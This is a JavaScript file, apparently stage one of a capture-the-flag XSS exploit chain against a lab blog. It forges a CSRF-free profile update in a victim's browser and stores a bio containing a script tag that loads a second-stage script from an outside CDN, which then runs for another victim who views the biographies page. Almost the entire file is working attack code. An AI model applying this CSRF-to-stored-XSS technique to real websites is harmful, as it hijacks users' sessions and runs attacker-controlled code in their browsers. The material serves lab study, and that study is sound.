// STAGE 1 — runs in Pepe's browser when he loads /comments (forced via social engineering).
// Pepe is an "expert", so his bio is rendered on /biographies. This stores a second
// <script src> inside Pepe's bio, which will later execute in Jeni's browser when she
// visits /biographies (the only page she ever opens).
//
// Same primitive as Desafio 9: POST /profile is multipart/form-data (fields `bio`,
// `profile_pic`), no anti-CSRF token, session cookie sent automatically (same-origin).

(async () => {
    // 1x1 red pixel JPEG, base64-encoded (profile_pic is required by the form).
    const b64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAj/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=";
    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const imgBlob = new Blob([bytes], { type: "image/jpeg" });

    // Payload stored in the bio: the stage-2 script that will run for whoever loads /biographies (Jeni).
    const bioPayload = '<script src="https://cdn.jsdelivr.net/gh/gonzaorban/CTF-Writeups@main/HackLab/xss/desafio-10-blog-hacklab-v2/assets/stage2.js"><\/script>';

    const fd = new FormData();
    fd.append("bio", bioPayload);
    fd.append("profile_pic", imgBlob, "pwned.jpg");

    await fetch("/profile", {
        method: "POST",
        credentials: "include",
        body: fd
    });
})();
